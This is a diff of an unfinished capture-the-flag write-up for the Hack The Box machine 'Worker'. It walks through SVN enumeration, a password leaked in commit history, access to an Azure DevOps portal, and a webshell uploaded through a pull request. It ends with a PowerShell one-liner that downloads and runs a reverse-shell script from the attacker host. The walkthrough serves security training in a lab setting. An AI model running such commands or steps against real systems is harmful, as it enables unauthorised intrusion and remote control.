@@ -1,18 +1,28 @@
+---
+description: >-
+  Zweilosec's writeup of the medium-difficulty Windows machine Worker from
+  https://hackthebox.eu
+---
+
 # HTB - Worker
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/1d1966b50bcba2e0fb7d3d9897c582c3ca64b5d4/windows-machines/medium/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-worker-infocard.png)
 
 Short description to include any strange things to be dealt with
 
+TODO: Finish writing and clean up
+
 ## Useful Skills and Tools
 
-#### [https://wadcoms.github.io/](https://wadcoms.github.io/)
+### Interactive Windows Command/Tool List
+
+[https://wadcoms.github.io/](https://wadcoms.github.io/)
 
 > WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
 
-#### Useful thing 2
+### Useful thing 2
 
 * description with generic example
 
@@ -85,7 +95,9 @@ Nmap done: 1 IP address (1 host up) scanned in 113.30 seconds
 
 3 ports - 80 - HTTP, 3690 - Subversion, and 5985 - Presumably WinRM
 
-nothing but default IIS on port 80, dirbuster reveals nothing of use
+![](../../.gitbook/assets/1-default-iis.png)
+
+nothing but default IIS on port 80, dirbuster revealed nothing of use
 
 [http://svnbook.red-bean.com/](http://svnbook.red-bean.com/)
 
@@ -102,7 +114,7 @@ svn: E170013: Unable to connect to a repository at URL 'http://10.10.10.203'
 svn: E175003: The server at 'http://10.10.10.203' does not support the HTTP/DAV protocol
 ```
 
-Next found there is a SVN protocol
+Was not able to connect the to page as HTTP, but after some reading found that there is a `SVN://` protocol.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
@@ -188,21 +200,39 @@ You can find the latest version at: http://devops.worker.htb
 
 The file `moved.txt` contained a message stating that the repo has been moved to another castle `devops.worker.htb`. I added this one to my hosts file as well
 
+![](../../.gitbook/assets/2-more-virtual-hosts.png)
+
 ```text
-                                                <!-- Work -->
-                                                        <article id="work">
-                                                                <h2 class="major">Work</h2>
-                                                                <span class="image main"><img src="images/pic02.jpg" alt="" /></span>
-                                                                <p>Curios on what we're currently working on are you? Well let's please you with a couple of teasers.</p>
-                                                                <a href="http://alpha.worker.htb/">Alpha</a><p>This is our first page</p>
-                                                                <a href="http://cartoon.worker.htb/">Cartoon</a><p>When we're not working we enjoy watching cartoons. Guess who in our team is what cartoon character!</p>
-                                                                <a href="http://lens.worker.htb/">Lens</a><p>This page is for you 40+:ers. Can you read it?</p>
-                                                                <a href="http://solid-state.worker.htb/">Solid State</a><p>We save our data in our datacenter on blazing fast solid-state storage.</p>
-                                                                <a href="http://spectral.worker.htb/">Spectral</a><p>Sounds almost like one of our favourite agents movies, but we also enjoy Hamilton</p>
-                                                                <a href="http://story.worker.htb/">Story</a><p>Lets make a long story short, end of story</p>
+     <!-- Work -->
+             <article id="work">
+                     <h2 class="major">Work</h2>
+                     <span class="image main"><img src="images/pic02.jpg" alt="" /></span>
+                     <p>Curios on what we're currently working on are you? Well let's please you with a couple of teasers.</p>
+                     <a href="http://alpha.worker.htb/">Alpha</a><p>This is our first page</p>
+                     <a href="http://cartoon.worker.htb/">Cartoon</a><p>When we're not working we enjoy watching cartoons. Guess who in our team is what cartoon character!</p>
+                     <a href="http://lens.worker.htb/">Lens</a><p>This page is for you 40+:ers. Can you read it?</p>
+                     <a href="http://solid-state.worker.htb/">Solid State</a><p>We save our data in our datacenter on blazing fast solid-state storage.</p>
+                     <a href="http://spectral.worker.htb/">Spectral</a><p>Sounds almost like one of our favourite agents movies, but we also enjoy Hamilton</p>
+                     <a href="http://story.worker.htb/">Story</a><p>Lets make a long story short, end of story</p>
 ```
 
 The file `index.html` contained another list of subdomains; again added to hosts
+
+![](../../.gitbook/assets/3-dimension-worker.png)
+
+Worker homepage using dimension theme
+
+![](../../.gitbook/assets/4-work.png)
+
+Links to other pages
+
+![](../../.gitbook/assets/5-cartoon.png)
+
+Cartoon character page, possible usernames?  The other pages did not contain anything that looked useful, so moved on to the `devops` domain I found earlier.
+
+![](../../.gitbook/assets/6-devops-login.png)
+
+The `devops` page required authentication
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
@@ -230,7 +260,7 @@ First version
 ------------------------------------------------------------------------
 ```
 
-Using the `log` command found the commit notes that described some of the progress that had been made
+Next, I used the `log` command and found the commit notes that described some of the progress that had been made on the repository.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
@@ -320,13 +350,49 @@ I checked the changes that had been made in each revision, and found that at one
 -$plain = "wendel98"
 ```
 
-This credential set did not work for logging into the devops page, not for WinRM. Reset the box and login worked for the devops page, still not for WinRM
+This credential set did not work for logging into the devops page, nor for WinRM. After getting no progress for awhile, I reset the box and the login worked for the devops page, still not for WinRM
 
 [https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/](https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/)
 
-found 3 usernames, and a possible password `w45ty45t`
+![](../../.gitbook/assets/7-ekenas.png)
+
+After logging in, I found myself in a Azure DevOps portal as the user named `ekenas`.
+
+![](../../.gitbook/assets/8-profile.png)
+
+
+
+When I clicked on the profile picture, I found the user's name and domain login information.
+
+![](../../.gitbook/assets/9-notifications.png)
+
+I checked through the user's settings, but there wasn't anything useful. 
+
+![](../../.gitbook/assets/10-smarthotel.png)
+
+Under the `ekenas` repository, there was a project for something called `SmartHotel360`
+
+![](../../.gitbook/assets/10-restorer.png)
+
+Under the Members section of the project I found icons for 2 other users.
+
+![](../../.gitbook/assets/10-smarth-repo.png)
+
+template for a page?
+
+![](../../.gitbook/assets/10-w4styt4st.png)
+
+Under SmartHotel360 there was a mostly empty project called `w45ty45t`.
+
+In all, found 3 usernames, and a possible password `w45ty45t`
 
 ## Initial Foothold
+
+None of the usernames or potential passwords got me anywhere, so I began to look closer at what I was able to do in the `SmartHotel360` repository.
+
+lots of screenshots -&gt; description - had to: 1. create new branch 2. upload file to new branch 3. add work item to commit 4. approve commit 5. wait for build to complete 6. merge with master 7. navigate to webshell
+
+![](../../.gitbook/assets/11-nopull%20%281%29.png)
 
 ```text
 TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.
@@ -334,9 +400,41 @@ TF402455: Pushes to this branch are not permitted; you must use a pull request t
 
 Tried to push a file uploaded through the web portal but got the above message
 
-The build takes so long that the cleanup takes place too quickly to do anything...
+![](../../.gitbook/assets/11-testbranch.png)
 
-lots of screenshots and descriptsion - had to: 1. create new branch 2. upload file to new branch 3. add work item to commit 4. approve commit 5. wait for build to complete 6. navigate to webshell
+Tried creating a new branch of the project called `test`.
+
+![](../../.gitbook/assets/11-limited-time.png)
+
+The build takes so long that the cleanup takes place too quickly to do anything... \(I think I must have finished creating my test branch just before the cleanup script or whatever cleared it the first time I did this\)
+
+![](../../.gitbook/assets/11-test-fixed-pull.png)
+
+Next I created a new pull request, trying to upload an `.aspx` file to see if I could get code execution.
+
+![](../../.gitbook/assets/11-test-upload-approve.png)
+
+After I submitted the pull request I had to approve it.  Luckily this user had the necessary permissions.
+
+![](../../.gitbook/assets/11-test--pull.png)
+
+Approved the file pull request and completed it.  If you have problems, make sure to check the `Policies` section on the right, as it does checks that have to be met first.
+
+![](../../.gitbook/assets/11-test-uploaded.png)
+
+My test branches were deleted multiple times before I figured out the rhythm of the portal and how to do everything.
+
+![](../../.gitbook/assets/11-test-upload-fail.png)
+
+Tried to access my web shell, but it said it wasn't there...
+
+![](../../.gitbook/assets/11-test-upload--link-work-first.png)
+
+Next I merged my test branch into the master
+
+![](../../.gitbook/assets/11-test-upload-win.png)
+
+After a lot of trial and error, I was able to upload my webshell, and tried to run a reverse shell script from my attack machine.
 
 ```text
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.98:8909/revShell.ps1')"
